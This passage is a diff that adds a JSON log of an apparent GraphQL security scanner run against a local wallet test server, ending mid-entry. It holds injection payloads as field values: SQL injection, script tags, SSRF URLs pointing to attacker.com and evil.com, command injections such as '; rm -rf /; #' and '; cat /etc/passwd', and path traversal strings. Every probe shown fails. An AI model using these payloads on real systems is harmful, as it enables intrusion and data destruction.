@@ -1,0 +1,4061 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:53:13.234427Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"123 OR 1=1--\") {\n    id\n    currency {\n      abbreviation\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:53:15.476935Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<script>alert('xss')</script>\") {\n    id\n    user {\n      firstName\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:53:18.154661Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://attacker.com/steal?id=\") {\n    id\n    balance\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:53:21.006920Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:53:23.549689Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:53:25.718403Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<h1>Malicious Header</h1><p>Content</p>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-05T16:53:28.534121Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  walletAlias: getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:53:38.966134Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:53:38.974375Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T16:53:38.974406Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.018,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:53:31.524778Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    nam\n    balance\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:53:33.843637Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:53:40.891934Z",
+    "count": 11,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:53:43.076561Z",
+    "count": 12,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<script>alert('xss')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:53:45.440396Z",
+    "count": 13,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://localhost:8080/admin\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:53:47.294839Z",
+    "count": 14,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; `ls -la`;\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:53:49.555496Z",
+    "count": 15,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:53:51.388066Z",
+    "count": 16,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<img src='x' onerror='alert(\\\"html\\\")'>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:53:53.053657Z",
+    "count": 17,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:53:55.421742Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:53:55.426958Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 18,
+    "timestamp": "2025-10-05T16:53:55.427001Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.008,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery bypassingDeny {\n  s: getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.015,
+        "timestamp": "2025-10-05T16:53:58.448089Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:53:58.453412Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-05T16:53:58.453433Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:54:01.036702Z",
+    "count": 20,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    nam\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:03.073936Z",
+    "count": 21,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:54:08.851531Z",
+    "count": 22,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"123' OR 1=1 --\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:54:10.595292Z",
+    "count": 23,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:54:12.948701Z",
+    "count": 24,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://evil.com/wallet_data\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:54:15.946941Z",
+    "count": 25,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"; rm -rf /; #\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:17.763088Z",
+    "count": 26,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:20.300552Z",
+    "count": 27,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<h1>Malicious HTML</h1>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:22.211803Z",
+    "count": 28,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:54:23.937297Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:54:23.943070Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 29,
+    "timestamp": "2025-10-05T16:54:23.943112Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
